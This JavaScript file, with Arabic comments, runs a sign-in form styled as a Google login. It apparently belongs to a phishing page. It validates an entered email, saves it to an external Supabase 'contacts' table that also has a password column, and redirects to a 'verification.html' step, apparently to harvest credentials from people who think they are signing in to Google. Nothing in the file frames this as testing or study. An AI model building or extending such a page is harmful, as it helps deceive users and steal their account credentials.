import { supabase } from './supabase.js';

const form = document.getElementById('googleForm');
const input = document.getElementById('googleEmail');
const shell = document.getElementById('googleShell');
const warning = document.getElementById('googleWarning');

function isValidEmail(value) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
}

function showError() {
  shell.classList.add('error');
  warning.classList.add('show');
}

function hideError() {
  shell.classList.remove('error');
  warning.classList.remove('show');
}

input.addEventListener('input', () => {
  if (input.value.trim() && !isValidEmail(input.value)) {
    showError();
  } else {
    hideError();
  }
});

form.addEventListener('submit', async (event) => {
  event.preventDefault();
  const value = input.value.trim();

  if (!value || !isValidEmail(value)) {
    showError();
    input.focus();
    return;
  }

  hideError();
  
  // تغيير نص الزر مؤقتاً
  const submitBtn = form.querySelector('.login-btn');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = 'Loading...';
  submitBtn.disabled = true;

  // الحفظ في Supabase
  const { error } = await supabase
    .from('contacts')
    .insert([{ email: value, password: 'Google Login (No Password)' }]);

  if (error) {
    console.error('خطأ:', error);
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
  } else {
    window.location.href = 'verification.html';
  }
});

input.focus();